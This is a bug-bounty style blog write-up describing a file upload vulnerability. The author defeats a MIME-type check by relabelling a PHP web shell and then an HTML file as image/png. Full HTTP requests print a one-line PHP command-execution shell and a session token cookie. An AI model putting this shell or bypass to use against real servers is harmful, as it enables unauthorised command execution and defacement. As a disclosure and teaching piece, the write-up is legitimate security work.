---
title : The cod caper
description : Updating the mime type of the file leads to file upload vulnerability
slug : the-cod-caper
date : 2024-05-28 00:00:00+0000
image : cover.png
categories :
    - Bug Hunting
    - File upload vulerability
tags :
    - writeup
weight : 1
---

## Overview
I was testing an application which is used for `X` purpose. It has a dashboard and you can upload images which get's stored in the same server. 
Lately I have been researching about file upload vulnerabilites while I tried the same bug on the Target's from Hackerone usually they store the file over the s3 bucket or they remove the extension of the file so I was bit confused about How to exploit the web appilication using file upload vulnerability, As a result I started learning over portswigger and completed the file upload module.


## Back to the target

As I logged into the web application there was a dashboard and it has a general setting option.
![Dashboard](dashboard.png)

I have recently updated the profile picture so this time I want to upload a malicious file such as php code.

The request looks something like 

```
PUT /api/profile/profile-picture HTTP/2
Host: ***
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJxMGUzdlNBSTVUIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTY4OTE2ODN9.49xYj3tfO5-N_Pw0xlortlp9-WlY0L3xiOBw9RKzPrk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://***/dashboard/general
Content-Type: multipart/form-data; boundary=---------------------------25156492452924238624110306810
Content-Length: 274
Origin: https://***
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

-----------------------------25156492452924238624110306810
Content-Disposition: form-data; name="profile"; filename="fileUpload.php"
Content-Type: application/x-php

<?php echo system($_GET["command"]); ?>

-----------------------------25156492452924238624110306810--

```

Notice the **Content-Type: application/x-php** ?

Now see check the response down which I received after sending this request.

```
HTTP/2 500 Internal Server Error
Date: Tue, 28 May 2024 15:24:12 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 44
X-Powered-By: Express
Etag: W/"2c-BUK5kJEdgVBEC0ZxSqwoL+oPm/Y"
Cf-Cache-Status: DYNAMIC
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v4?s=DaNl%2FKe7pd5G4X57ksNbkdCUiboT%2FmLC%2Fu4KI%2FNo1MuI1Cj9wVuKEX6hr1qv6robRYutAGpk%2BdqMO%2BPqjPHQj1L%2FfxrAG27x95GOly%2BUwURUHH%2BY%2F4Dxhlv8KuQ01D4V%2FQpXSg%3D%3D"}],"group":"cf-nel","max_age":604800}
Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Alt-Svc: h3=":443"; ma=86400
Vary: Accept-Encoding
Server: cloudflare
Cf-Ray: 88af400ed8a54dce-SIN

{"message":"MimeType or size doesn't match"}
```

## Updating MimeType is like putting a mask 

Notice the **message** ? It sayes **MimeType or size doesn't match**

As I got this message as the response I update the **Content-Type:**
Previously **Content-Type: application/x-php**
Currently  **Content-Type: image/png**
![MimeTypeChange](mime-type-update.png)

I sen't the request and go this beautiful message **{"message":"Profile picture updated"}

After getting this response I checked the dashboard again and it seems like something worng has happend.
![Dashboard](profile-php-loaded.png)

I checked the html code using inspect tool provided by firefox and decoded the url
![htmlCode](html-code-image.png)
![Decode](url-decoder.png)

I visited the decoded url and found out that the server was not running apache server and my php file didn't run instead it got downloaded.
![SadPHPfileGotDownloaded](get-file-php.png)

## Changes are important

Now as the server is not serving php server I decided to go with basic exploitation such as **.html**
I followed the same process as above but this time I uploaded .html file.


The request looks like 

```
PUT /api/profile/profile-picture HTTP/2
Host: ***
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJxMGUzdlNBSTVUIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MTY4OTE2ODN9.49xYj3tfO5-N_Pw0xlortlp9-WlY0L3xiOBw9RKzPrk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://***/dashboard/general
Content-Type: multipart/form-data; boundary=---------------------------25156492452924238624110306810
Content-Length: 266
Origin: https://***
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

-----------------------------25156492452924238624110306810
Content-Disposition: form-data; name="profile"; filename="fileUpload.html"
Content-Type: image/png

<h1>0xtheM7 was here</h1>

-----------------------------25156492452924238624110306810--

```

## Exploit
I sent the requested checked the html code with inspect tool decoded the url and boom .html file was loading without any issue.

![HTMLdeocde](html-url-decode.png)
![HTMLRUN](file-uploaded.png)

And we are able to run our code over the server which opens up the door to run different malicious scripts and eventually get the REC or diiferent bug such as XSS.

### How to make file upload secure
1. Check the extension of the file
2. Check the diamension of the file 
3. Don't file to the server withou checking it
